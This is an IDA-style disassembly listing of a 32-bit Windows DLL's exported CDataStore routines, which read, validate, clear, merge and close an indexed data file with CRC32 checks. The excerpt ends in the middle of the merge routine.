		lea	ecx, [ebp+0C4h+var_144]
		call	Ordinal1230
		mov	ecx, [ebp+0C4h+var_4]
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		add	ebp, 0C4h
		leave
		retn	20h
Ordinal587	endp

; Exported entry 588.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal588
Ordinal588	proc near		; CODE XREF: Ordinal431+4Dp
					; Ordinal585+9p
					; DATA XREF: ...

Buffer		= byte ptr -38h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_24		= dword	ptr -24h
var_18		= byte ptr -18h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_18]
		call	Ordinal1228
		lea	ebx, [esi+8]
		mov	ecx, ebx
		call	Ordinal1137
		test	eax, eax
		jnz	short loc_6AF410A7
		mov	[esi+20h], edi
		xor	esi, esi
		inc	esi
		jmp	loc_6AF4114A
; ---------------------------------------------------------------------------

loc_6AF410A7:				; CODE XREF: Ordinal588+2Bj
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		mov	ecx, esi
		mov	[ebp+var_4], 1
		mov	[ebp+var_C], edi
		mov	[ebp+var_8], edi
		call	Ordinal614
		test	eax, eax
		jnz	short loc_6AF410CE
		push	offset aCdatastoreClos ; "CDataStore::Close() :	ReadHeader() ==	F"...
		jmp	short loc_6AF41122
; ---------------------------------------------------------------------------

loc_6AF410CE:				; CODE XREF: Ordinal588+56j
		cmp	[esi+1Ch], edi
		mov	eax, [ebp+var_C]
		mov	[ebp+var_30], eax
		mov	eax, [ebp+var_8]
		mov	[ebp+var_2C], eax
		jz	short loc_6AF4110B
		mov	eax, [esi+20h]
		cmp	eax, edi
		jbe	short loc_6AF4110B
		lea	ecx, [ebp+var_24]
		push	ecx		; int
		push	edi		; int
		push	eax		; int
		push	edi		; int
		push	20h		; lDistanceToMove
		push	ebx		; int
		call	Ordinal582
		add	esp, 18h
		test	eax, eax
		jnz	short loc_6AF4110E
		push	offset aCdatastoreCl_0 ; "CDataStore::Close() :	CCRC32::File() =="...
		call	sub_6AF3102E
		mov	[ebp+var_24], edi
		jmp	short loc_6AF41127
; ---------------------------------------------------------------------------

loc_6AF4110B:				; CODE XREF: Ordinal588+6Ej
					; Ordinal588+75j
		mov	[ebp+var_24], edi

loc_6AF4110E:				; CODE XREF: Ordinal588+8Bj
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, esi
		call	Ordinal613
		test	eax, eax
		jnz	short loc_6AF4112B
		push	offset aCdatastoreCl_1 ; "CDataStore::Close() :	WriteHeader() == "...

loc_6AF41122:				; CODE XREF: Ordinal588+5Dj
		call	sub_6AF3102E

loc_6AF41127:				; CODE XREF: Ordinal588+9Aj
		pop	ecx
		mov	[ebp+var_4], edi

loc_6AF4112B:				; CODE XREF: Ordinal588+ACj
		mov	ecx, ebx
		mov	[esi+20h], edi
		call	Ordinal774
		test	eax, eax
		jnz	short loc_6AF41147
		push	offset aCdatastoreCl_2 ; "CDataStore::Close() :	m_File.Close() =="...
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_4], edi

loc_6AF41147:				; CODE XREF: Ordinal588+C8j
		mov	esi, [ebp+var_4]

loc_6AF4114A:				; CODE XREF: Ordinal588+33j
		lea	ecx, [ebp+var_18]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal588	endp

; Exported entry 589.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal589
Ordinal589	proc near		; CODE XREF: Ordinal432+5Ap
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, esi
		call	Ordinal621
		mov	eax, [esi+20h]
		add	eax, 20h
		push	0		; int
		push	eax		; lDistanceToMove
		lea	ecx, [esi+8]
		call	Ordinal789
		test	eax, eax
		jnz	short loc_6AF411A0
		push	offset aCdatastoreClea ; "CDataStore::Clear() :	m_File.SetLength("...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF411A3
; ---------------------------------------------------------------------------

loc_6AF411A0:				; CODE XREF: Ordinal589+36j
		xor	esi, esi
		inc	esi

loc_6AF411A3:				; CODE XREF: Ordinal589+45j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal589	endp

; Exported entry 592.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal592(LONG	lDistanceToMove, int, LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
		public Ordinal592
Ordinal592	proc near		; CODE XREF: Ordinal609+11Bp
					; DATA XREF: .rdata:off_6AF66098o

Buffer		= byte ptr -3Ch
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lDistanceToMove	= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpBuffer	= dword	ptr  10h
nNumberOfBytesToRead= dword ptr	 14h

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	edi, [ebp+lDistanceToMove]
		mov	ebx, [ebp+arg_4]
		mov	eax, edi
		or	eax, ebx
		jz	loc_6AF41284
		xor	eax, eax
		cmp	[ebp+nNumberOfBytesToRead], eax
		jz	loc_6AF41284
		cmp	[ebp+lpBuffer],	eax
		jz	loc_6AF41284
		mov	[ebp+var_8], eax
		mov	[ebp+var_4], eax
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	ebx		; int
		push	edi		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF41214
		push	offset aCdatastoreR_17 ; "CDataStore::Read() : ReadIndex() == FAL"...
		jmp	short loc_6AF41289
; ---------------------------------------------------------------------------

loc_6AF41214:				; CODE XREF: Ordinal592+5Bj
		cmp	[ebp+var_20], 0
		jnz	short loc_6AF41221
		push	offset aCdatastoreR_18 ; "CDataStore::Read() : index.m_dwDataSize"...
		jmp	short loc_6AF41289
; ---------------------------------------------------------------------------

loc_6AF41221:				; CODE XREF: Ordinal592+68j
		mov	eax, [ebp+nNumberOfBytesToRead]
		cmp	eax, [ebp+var_20]
		jbe	short loc_6AF41230
		push	offset aCdatastoreR_19 ; "CDataStore::Read() : dwSize >	index.m_d"...
		jmp	short loc_6AF41289
; ---------------------------------------------------------------------------

loc_6AF41230:				; CODE XREF: Ordinal592+77j
		push	eax		; nNumberOfBytesToRead
		push	[ebp+lpBuffer]	; lpBuffer
		add	edi, 28h
		adc	ebx, 0
		push	ebx		; int
		lea	ecx, [esi+8]
		push	edi		; lDistanceToMove
		call	Ordinal779
		test	eax, eax
		jnz	short loc_6AF4125A
		lea	ecx, [esi+8]
		call	Ordinal236
		mov	[esi+14h], eax
		push	offset aCdatastoreR_20 ; "CDataStore::Read() : m_File.Read() ==	F"...
		jmp	short loc_6AF41289
; ---------------------------------------------------------------------------

loc_6AF4125A:				; CODE XREF: Ordinal592+96j
		mov	eax, [ebp+var_20]
		cmp	[ebp+nNumberOfBytesToRead], eax
		jnz	short loc_6AF4127F
		cmp	dword ptr [esi+1Ch], 0
		jz	short loc_6AF4127F
		push	eax
		push	[ebp+lpBuffer]
		call	Ordinal581
		cmp	eax, [ebp+var_1C]
		pop	ecx
		pop	ecx
		jz	short loc_6AF4127F
		push	offset aCdatastoreR_21 ; "CDataStore::Read() : dwCRC32 != index.m"...
		jmp	short loc_6AF41289
; ---------------------------------------------------------------------------

loc_6AF4127F:				; CODE XREF: Ordinal592+B0j
					; Ordinal592+B6j ...
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF41291
; ---------------------------------------------------------------------------

loc_6AF41284:				; CODE XREF: Ordinal592+28j
					; Ordinal592+33j ...
		push	offset aCdatastoreR_22 ; "CDataStore::Read() : uIndex =	0\n"

loc_6AF41289:				; CODE XREF: Ordinal592+62j
					; Ordinal592+6Fj ...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi

loc_6AF41291:				; CODE XREF: Ordinal592+D2j
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal592	endp

; Exported entry 593.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal593(LONG	lDistanceToMove, int, int)
		public Ordinal593
Ordinal593	proc near		; DATA XREF: .rdata:off_6AF66098o

Buffer		= byte ptr -3Ch
var_20		= dword	ptr -20h
var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lDistanceToMove	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	eax, [ebp+lDistanceToMove]
		or	eax, [ebp+arg_4]
		mov	ebx, [ebp+arg_8]
		mov	[ebx], edi
		jnz	short loc_6AF412DB
		push	offset aCdatastoreGeti ; "CDataStore::GetIndexSize() : uIndex =	0"...

loc_6AF412D3:				; CODE XREF: Ordinal593+5Dj
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF41309
; ---------------------------------------------------------------------------

loc_6AF412DB:				; CODE XREF: Ordinal593+2Aj
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	[ebp+arg_4]	; int
		mov	ecx, esi
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		mov	[ebp+var_8], edi
		mov	[ebp+var_4], edi
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF41301
		push	offset aCdatastoreGe_0 ; "CDataStore::GetIndexSize() : ReadIndex("...
		jmp	short loc_6AF412D3
; ---------------------------------------------------------------------------

loc_6AF41301:				; CODE XREF: Ordinal593+56j
		mov	eax, [ebp+var_20]
		xor	edi, edi
		mov	[ebx], eax
		inc	edi

loc_6AF41309:				; CODE XREF: Ordinal593+37j
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal593	endp

; Exported entry 607.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal607(void	*Dst)
		public Ordinal607
Ordinal607	proc near		; DATA XREF: .rdata:off_6AF66098o

Buffer		= byte ptr -40h
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_18		= byte ptr -18h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
Dst		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [ebx+84h]
		push	eax
		lea	ecx, [ebp+var_18]
		mov	[ebp+var_4], ebx
		call	Ordinal1228
		mov	esi, [ebp+Dst]
		push	40h		; Size
		push	edi		; Val
		push	esi		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		mov	ecx, ebx
		mov	[ebp+var_C], edi
		mov	[ebp+var_8], edi
		call	Ordinal617
		test	eax, eax
		jnz	short loc_6AF4136B
		push	offset aCdatastoreGets ; "CDataStore::GetStatistics() :	ReadFirst"...
		jmp	short loc_6AF413DC
; ---------------------------------------------------------------------------

loc_6AF4136B:				; CODE XREF: Ordinal607+48j
		push	1
		pop	ebx
		jmp	short loc_6AF413CB
; ---------------------------------------------------------------------------

loc_6AF41370:				; CODE XREF: Ordinal607+B7j
		mov	ecx, [ebp+var_24]
		cmp	ecx, edi
		mov	eax, [ebp+var_28]
		jnz	short loc_6AF41388
		add	[esi+20h], ebx
		adc	[esi+24h], edi
		add	[esi+28h], eax
		adc	[esi+2Ch], edi
		jmp	short loc_6AF413B3
; ---------------------------------------------------------------------------

loc_6AF41388:				; CODE XREF: Ordinal607+5Ej
		cmp	ecx, eax
		jnz	short loc_6AF41399
		add	[esi], ebx
		adc	[esi+4], edi
		add	[esi+8], eax
		adc	[esi+0Ch], edi
		jmp	short loc_6AF413B3
; ---------------------------------------------------------------------------

loc_6AF41399:				; CODE XREF: Ordinal607+70j
		add	[esi+10h], ebx
		adc	[esi+14h], edi
		add	[esi+30h], ebx
		adc	[esi+34h], edi
		add	[esi+18h], ecx
		adc	[esi+1Ch], edi
		sub	eax, ecx
		add	[esi+38h], eax
		adc	[esi+3Ch], edi

loc_6AF413B3:				; CODE XREF: Ordinal607+6Cj
					; Ordinal607+7Dj
		mov	ecx, [ebp+var_4]
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		lea	eax, [ebp+Buffer]
		push	eax		; int
		call	Ordinal618
		test	eax, eax
		jz	short loc_6AF413D7

loc_6AF413CB:				; CODE XREF: Ordinal607+54j
		mov	eax, [ebp+var_38]
		or	eax, [ebp+var_34]
		jnz	short loc_6AF41370
		mov	edi, ebx
		jmp	short loc_6AF413E2
; ---------------------------------------------------------------------------

loc_6AF413D7:				; CODE XREF: Ordinal607+AFj
		push	offset aCdatastoreGe_1 ; "CDataStore::GetStatistics() :	ReadNextI"...

loc_6AF413DC:				; CODE XREF: Ordinal607+4Fj
		call	sub_6AF3102E
		pop	ecx

loc_6AF413E2:				; CODE XREF: Ordinal607+BBj
		lea	ecx, [ebp+var_18]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal607	endp

; Exported entry 609.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal609
Ordinal609	proc near		; CODE XREF: Ordinal441+9p
					; DATA XREF: .rdata:6AF5AA7Co ...

var_64		= dword	ptr -64h
lDistanceToMove	= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_4C		= dword	ptr -4Ch
nNumberOfBytesToRead= byte ptr -48h
Buffer		= byte ptr -3Ch
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_1C		= byte ptr -1Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 64h
		push	ebx
		push	edi
		mov	ebx, ecx
		call	Ordinal621
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		xor	edi, edi
		push	eax		; int
		mov	ecx, ebx
		mov	[ebp+var_C], edi
		mov	[ebp+var_8], edi
		call	Ordinal614
		test	eax, eax
		jnz	short loc_6AF4142F
		push	offset aCdatastoreVali ; "CDataStore::ValidateFile() : ReadHeader"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF415CE
; ---------------------------------------------------------------------------

loc_6AF4142F:				; CODE XREF: Ordinal609+28j
		cmp	[ebx+1Ch], edi
		push	esi		; Args
		jz	short loc_6AF41493
		cmp	[ebp+var_2C], edi
		jbe	short loc_6AF41493
		cmp	[ebp+var_28], edi
		jz	short loc_6AF41488
		lea	eax, [ebp+var_4]
		push	eax		; int
		push	edi		; int
		push	dword ptr [ebx+20h] ; int
		lea	esi, [ebx+8]
		push	edi		; int
		push	20h		; lDistanceToMove
		push	esi		; int
		mov	[ebp+var_4], edi
		call	Ordinal582
		add	esp, 18h
		test	eax, eax
		jnz	short loc_6AF41479
		mov	ecx, esi
		call	Ordinal236
		mov	[ebx+14h], eax
		push	offset aCdatastoreVa_0 ; "CDataStore::ValidateFile() : CCRC32::Fi"...

loc_6AF4146C:				; CODE XREF: Ordinal609+93j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF415CD
; ---------------------------------------------------------------------------

loc_6AF41479:				; CODE XREF: Ordinal609+68j
		mov	eax, [ebp+var_4]
		cmp	eax, [ebp+var_28]
		jz	short loc_6AF41493
		push	offset aCdatastoreVa_1 ; "CDataStore::ValidateFile() : dwCRC32 !="...
		jmp	short loc_6AF4146C
; ---------------------------------------------------------------------------

loc_6AF41488:				; CODE XREF: Ordinal609+4Aj
		push	offset aCdatastoreVa_2 ; "CDataStore::ValidateFile() : header.m_d"...
		call	sub_6AF3101A
		pop	ecx

loc_6AF41493:				; CODE XREF: Ordinal609+40j
					; Ordinal609+45j ...
		lea	ecx, [ebp+var_1C]
		call	Ordinal861
		lea	eax, [ebp+var_64]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		mov	ecx, ebx
		mov	[ebp+var_4], 1
		call	Ordinal617
		test	eax, eax
		jnz	short loc_6AF414C5
		push	offset aCdatastoreVa_3 ; "CDataStore::ValidateFile() : ReadFirstI"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF415C3
; ---------------------------------------------------------------------------

loc_6AF414C5:				; CODE XREF: Ordinal609+C0j
		mov	eax, [ebp+lDistanceToMove]
		or	eax, [ebp+var_58]
		jz	loc_6AF415BD
		jmp	short loc_6AF414D5
; ---------------------------------------------------------------------------

loc_6AF414D3:				; CODE XREF: Ordinal609+183j
		xor	edi, edi

loc_6AF414D5:				; CODE XREF: Ordinal609+DEj
		cmp	dword ptr [ebp+nNumberOfBytesToRead], edi
		jbe	short loc_6AF41532
		lea	ecx, [ebp+var_1C]
		call	Ordinal236
		cmp	eax, dword ptr [ebp+nNumberOfBytesToRead]
		jnb	short loc_6AF414FA
		push	dword ptr [ebp+nNumberOfBytesToRead] ; Args
		lea	ecx, [ebp+var_1C]
		call	Ordinal870
		test	eax, eax
		jz	loc_6AF4157E

loc_6AF414FA:				; CODE XREF: Ordinal609+F2j
		push	dword ptr [ebp+nNumberOfBytesToRead] ; nNumberOfBytesToRead
		lea	ecx, [ebp+var_1C]
		call	Ordinal865
		push	eax		; lpBuffer
		push	[ebp+var_58]	; int
		mov	ecx, ebx
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		call	Ordinal592
		test	eax, eax
		jz	short loc_6AF41591
		push	dword ptr [ebp+nNumberOfBytesToRead]
		mov	esi, [ebx]
		lea	ecx, [ebp+var_1C]
		call	Ordinal865
		push	eax
		lea	eax, [ebp+var_64]
		push	eax
		mov	ecx, ebx
		call	dword ptr [esi+8]
		test	eax, eax
		jz	short loc_6AF41598

loc_6AF41532:				; CODE XREF: Ordinal609+E5j
		mov	eax, [ebx+4Ch]
		mov	ecx, [ebx+48h]
		mov	edx, [ebp+var_4C]
		sub	ecx, eax
		sub	edx, eax
		cmp	edx, ecx
		jbe	short loc_6AF4154E
		push	0Ah
		lea	edi, [ebx+30h]
		pop	ecx
		lea	esi, [ebp+var_64]
		rep movsd

loc_6AF4154E:				; CODE XREF: Ordinal609+14Ej
		push	0Ah
		pop	ecx
		lea	eax, [ebp+var_64]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		lea	edi, [ebx+58h]
		lea	esi, [ebp+var_64]
		lea	eax, [ebp+var_64]
		rep movsd
		push	eax		; int
		mov	ecx, ebx
		call	Ordinal618
		test	eax, eax
		jz	short loc_6AF415A7
		mov	eax, [ebp+lDistanceToMove]
		or	eax, [ebp+var_58]
		jnz	loc_6AF414D3
		jmp	short loc_6AF415BD
; ---------------------------------------------------------------------------

loc_6AF4157E:				; CODE XREF: Ordinal609+101j
		push	offset aCdatastoreVa_4 ; "CDataStore::ValidateFile() : data.NewAl"...
		call	sub_6AF3102E
		mov	dword ptr [ebx+14h], 0Eh
		jmp	short loc_6AF415A2
; ---------------------------------------------------------------------------

loc_6AF41591:				; CODE XREF: Ordinal609+122j
		push	offset aCdatastoreVa_5 ; "CDataStore::ValidateFile() : Read() == "...
		jmp	short loc_6AF4159D
; ---------------------------------------------------------------------------

loc_6AF41598:				; CODE XREF: Ordinal609+13Dj
		push	offset aCdatastoreVa_6 ; "CDataStore::ValidateFile() : ValidateDa"...

loc_6AF4159D:				; CODE XREF: Ordinal609+1A3j
		call	sub_6AF3102E

loc_6AF415A2:				; CODE XREF: Ordinal609+19Cj
		mov	[ebp+var_4], edi
		jmp	short loc_6AF415B5
; ---------------------------------------------------------------------------

loc_6AF415A7:				; CODE XREF: Ordinal609+17Bj
		push	offset aCdatastoreVa_6 ; "CDataStore::ValidateFile() : ValidateDa"...
		call	sub_6AF3102E
		and	[ebp+var_4], 0

loc_6AF415B5:				; CODE XREF: Ordinal609+1B2j
		pop	ecx
		mov	ecx, ebx
		call	Ordinal621

loc_6AF415BD:				; CODE XREF: Ordinal609+D8j
					; Ordinal609+189j
		mov	edi, [ebp+var_4]
		mov	[ebx+28h], edi

loc_6AF415C3:				; CODE XREF: Ordinal609+CDj
		lea	ecx, [ebp+var_1C]
		call	Ordinal863
		mov	eax, edi

loc_6AF415CD:				; CODE XREF: Ordinal609+81j
		pop	esi

loc_6AF415CE:				; CODE XREF: Ordinal609+37j
		pop	edi
		pop	ebx
		leave
		retn
Ordinal609	endp ; sp-analysis failed

; Exported entry 616.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal616
Ordinal616	proc near		; CODE XREF: Ordinal615+20p
					; DATA XREF: .rdata:off_6AF66098o

var_5C		= byte ptr -5Ch
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
Buffer		= byte ptr -34h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		mov	[ebp+var_4], ecx
		mov	ecx, [ebp+arg_4]
		xor	eax, eax
		push	ebx
		mov	ebx, [ebp+arg_0]
		mov	[ecx], eax
		mov	ecx, [ebx+8]
		or	ecx, [ebx+0Ch]
		jnz	short loc_6AF415F4
		inc	eax
		jmp	loc_6AF418E8
; ---------------------------------------------------------------------------

loc_6AF415F4:				; CODE XREF: Ordinal616+1Aj
		push	esi
		push	edi		; Args
		push	0Ah
		pop	ecx
		push	0Ah
		mov	[ebp+var_C], eax
		mov	[ebp+var_8], eax
		mov	esi, ebx
		lea	edi, [ebp+var_5C]
		rep movsd
		pop	ecx
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		mov	esi, ebx
		lea	edi, [ebp+Buffer]
		push	eax		; int
		rep movsd
		mov	ecx, [ebp+var_4]
		push	ebx		; int
		call	Ordinal618
		test	eax, eax
		jz	loc_6AF418D9
		mov	edi, [ebp+var_4]
		lea	eax, [ebp+var_5C]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		push	ebx		; int
		mov	ecx, edi
		call	Ordinal619
		test	eax, eax
		jz	loc_6AF418D9
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jz	loc_6AF416D2
		xor	ecx, ecx
		cmp	[ebp+var_18], ecx
		jnz	short loc_6AF416D2
		cmp	ecx, ecx
		mov	eax, [ebx+18h]
		mov	edx, [ebp+var_1C]
		lea	eax, [eax+edx+28h]
		ja	short loc_6AF4166A
		cmp	eax, 0FFFFFFFFh
		jbe	short loc_6AF41677

loc_6AF4166A:				; CODE XREF: Ordinal616+91j
		push	offset aCdatastoreMerg ; "CDataStore::MergeEx()	: uBlockSize > DW"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF416D2
; ---------------------------------------------------------------------------

loc_6AF41677:				; CODE XREF: Ordinal616+96j
		push	ebx
		mov	ecx, edi
		mov	[ebx+18h], eax
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		push	ebx		; int
		mov	ecx, edi
		call	Ordinal618
		test	eax, eax
		jz	loc_6AF418D9
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jz	short loc_6AF416C9
		mov	eax, [ebx+8]
		mov	[ebp+var_24], eax
		mov	eax, [ebx+0Ch]
		mov	[ebp+var_20], eax
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, edi
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892

loc_6AF416C9:				; CODE XREF: Ordinal616+D6j
		mov	eax, [ebp+arg_4]
		mov	dword ptr [eax], 1

loc_6AF416D2:				; CODE XREF: Ordinal616+78j
					; Ordinal616+83j ...
		xor	ecx, ecx
		cmp	[ebx+1Ch], ecx
		jnz	loc_6AF41786
		mov	eax, [ebp+var_54]
		or	eax, [ebp+var_50]
		jz	loc_6AF41786
		cmp	[ebp+var_40], ecx
		jnz	loc_6AF41786
		cmp	ecx, ecx
		mov	eax, [ebx+18h]
		mov	edx, [ebp+var_44]
		lea	eax, [eax+edx+28h]
		ja	short loc_6AF41705
		cmp	eax, 0FFFFFFFFh
		jbe	short loc_6AF41712

loc_6AF41705:				; CODE XREF: Ordinal616+12Cj
		push	offset aCdatastoreMerg ; "CDataStore::MergeEx()	: uBlockSize > DW"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF41786
; ---------------------------------------------------------------------------

loc_6AF41712:				; CODE XREF: Ordinal616+131j
		mov	[ebp+var_44], eax
		lea	eax, [ebp+var_5C]
		push	eax
		mov	ecx, edi
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jz	short loc_6AF4174F
		mov	eax, [ebp+var_54]
		mov	[ebp+var_24], eax
		mov	eax, [ebp+var_50]
		mov	[ebp+var_20], eax
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, edi
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892

loc_6AF4174F:				; CODE XREF: Ordinal616+15Cj
		mov	eax, [ebp+arg_4]
		push	0Ah
		mov	dword ptr [eax], 1
		pop	ecx
		lea	esi, [ebp+var_5C]
		mov	edi, ebx
		rep movsd
		mov	eax, [ebx+8]
		or	eax, [ebx+0Ch]
		jz	short loc_6AF41783
		mov	ecx, [ebp+var_4]
		lea	eax, [ebp+var_5C]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		push	ebx		; int
		call	Ordinal619
		test	eax, eax
		jz	loc_6AF4187C

loc_6AF41783:				; CODE XREF: Ordinal616+196j
		mov	edi, [ebp+var_4]

loc_6AF41786:				; CODE XREF: Ordinal616+105j
					; Ordinal616+111j ...
		mov	esi, [ebp+var_44]
		mov	ecx, [ebp+var_40]
		sub	esi, ecx
		cmp	dword ptr [ebx+1Ch], 0
		jnz	loc_6AF4181B
		mov	eax, [ebp+var_54]
		or	eax, [ebp+var_50]
		jz	short loc_6AF4181B
		test	esi, esi
		jbe	short loc_6AF4181B
		mov	eax, [ebx+18h]
		add	eax, esi
		cmp	eax, 0FFFFFFFFh
		jbe	short loc_6AF417BB
		push	offset aCdatastoreMerg ; "CDataStore::MergeEx()	: uBlockSize > DW"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF4181B
; ---------------------------------------------------------------------------

loc_6AF417BB:				; CODE XREF: Ordinal616+1DAj
		lea	eax, [ebp+var_5C]
		mov	[ebp+var_44], ecx
		push	eax
		mov	ecx, edi
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892
		sub	[ebx+8], esi
		push	ebx
		mov	ecx, edi
		sbb	dword ptr [ebx+0Ch], 0
		add	[ebx+18h], esi
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jz	short loc_6AF41812
		mov	eax, [ebx+8]
		mov	[ebp+var_24], eax
		mov	eax, [ebx+0Ch]
		mov	[ebp+var_20], eax
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, edi
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41892

loc_6AF41812:				; CODE XREF: Ordinal616+21Fj
		mov	eax, [ebp+arg_4]
		mov	dword ptr [eax], 1

loc_6AF4181B:				; CODE XREF: Ordinal616+1C0j
					; Ordinal616+1CCj ...
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jnz	loc_6AF418D4
		mov	eax, [ebx+1Ch]
		mov	ecx, [ebx+18h]
		sub	ecx, eax
		jz	loc_6AF418D4
		test	eax, eax
		jnz	short loc_6AF41883
